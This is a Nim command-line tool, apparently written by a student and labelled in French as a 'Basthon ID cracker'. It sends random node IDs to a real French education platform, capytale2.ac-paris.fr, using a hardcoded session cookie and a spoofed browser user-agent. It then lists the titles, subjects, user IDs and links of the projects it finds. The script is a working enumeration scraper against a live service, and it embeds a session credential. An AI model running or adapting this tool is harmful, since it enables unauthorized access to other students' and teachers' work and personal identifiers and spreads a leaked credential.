import strformat, httpclient, json, strutils, os, random, tables, os

const link = "https://capytale2.ac-paris.fr/web/node/"
const link_format = "?_format=json"

type EKeyboardInterrupt = object of CatchableError
proc handler() {.noconv.} =
  raise newException(EKeyboardInterrupt, "Keyboard Interrupt")
setControlCHook(handler)

proc read(args: string): string =
  stdout.write(args)
  result = stdin.readline()

randomize()

var
  ens_count = initCountTable[string]()
  acti_count = initCountTable[string]()
  enseignement: string
  link_type: string
  code: string
  verbose: bool
  loops: Natural = 100

if paramCount() < 1:
  verbose = false
elif paramStr(1) == "--verbose" or paramStr(1) == "-v":
  verbose = true

elif paramStr(1).startsWith("--loops") or paramStr(1).startsWith("-l"):
  loops = parseInt(paramStr(2))

elif paramStr(1) == "-h" or paramStr(1) == "--help":
  echo """
Programme fais en NIM afin de craquer les ID des projets Basthon

    -h, --help      Affiche la page d'aide
    -v, --verbose   Affiche les codes invalides
    -l, --loops     Nombre de projet à trouver (cassé)
"""
  quit(0)

let
  red = "\e[31m"
  yellow = "\e[33m"
  cyan = "\e[36m"
  green = "\e[32m"
  blue = "\e[34m"
  magenta = "\e[35m"
  italic = "\e[3m"
  def = "\e[0m"

let banner = &"""
{cyan}    ____  ___   _____ __________  ___   ________ __
   / __ )/   | / ___// ____/ __ \/   | / ____/ //_/
  / __  / /| | \__ \/ /   / /_/ / /| |/ /   / ,<
 / /_/ / ___ |___/ / /___/ _, _/ ___ / /___/ /| |
/_____/_/  |_/____/\____/_/ |_/_/  |_\____/_/ |_| {def}
                {red}Basthon ID cracker{def}

"""

proc check(): string =
  let client = newHttpClient("Mozilla/5.0 (X11; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0")
  # To get a new cookie open firefox and make a request to https://capytale2.ac-paris.fr/web/node/5039?_format=json then look into the headers by editing and sending back the request
  client.headers = newHttpHeaders({"Cookie": "SSESSa18a31b7866bf068984fd7a59261a89b=WUqf8GVo-y59MLg3WYZa-VNzKpVuPQlplWDXUf7wMsc"})
  let content = client.get(link & code & link_format)
  client.close()
  os.sleep(500)
  if content.body == "{\"message\":\"\"}":
    if verbose: echo &"{yellow}[ERROR]{def} Invalid code: {code}"
    code = &"{rand(1000..99999)}"
    discard
  else:
    code = &"{rand(1000..99999)}"
    return content.body


proc show_res() =
  if len(ens_count) > 0:
    echo &"\nAffichages du nombre de projets par {blue}matières{def}:"
    for ens in ens_count.keys:
      echo &"{ens.toUpperAscii()}: {ens_count[ens]} projets trouvé(s)"

    echo &"\nAffichages du nombre de projets par {blue}activités{def}:"
    for act in acti_count.keys:
      echo &"{act.toUpperAscii()}: {acti_count[act]} projets trouvé(s)"


try:
  echo banner
  # Starting ID: 5039
  code = read(&"Entrez le {blue}premier{def} ID à tester > ")
  for i in 1..loops:
    let str_r = check()
    try:
      let json = parseJson(str_r)
      let
        id = json{"nid"}[0]{"value"}.getInt()
        activity_type = json{"type"}[0]{"target_id"}.getStr()
        user_id = json{"uid"}[0]{"target_id"}.getInt()
        title = json{"title"}[0]{"value"}.getStr()


      if json{"field_enseignement"}[0]{"value"}.getStr() ==
          "": enseignement = "No enseignement" else: enseignement = json{
          "field_enseignement"}[0]{"value"}.getStr()
      if activity_type == "notebook": link_type = "notebook" else: link_type = "console"
      ens_count.inc(enseignement)
      acti_count.inc(activity_type)

      echo &"\n------------------------\n{red}ID{def}: {id}\n{yellow}TITRE{def}: {title}\n{cyan}MATIERE{def}: {enseignement}\n{blue}TYPE{def}: {activity_type}\n{magenta}ID Utilisateur{def}: {user_id}\n{green}Lien{def}: {italic}https://capytale2.ac-paris.fr/basthon/{link_type}/?id={id}{def}\n------------------------\n"
    except:
      discard
except EKeyboardInterrupt:
  show_res()
  echo "\nVous allez quiter le logiciel... " & green & ";)" & def
  quit(0)

show_res()
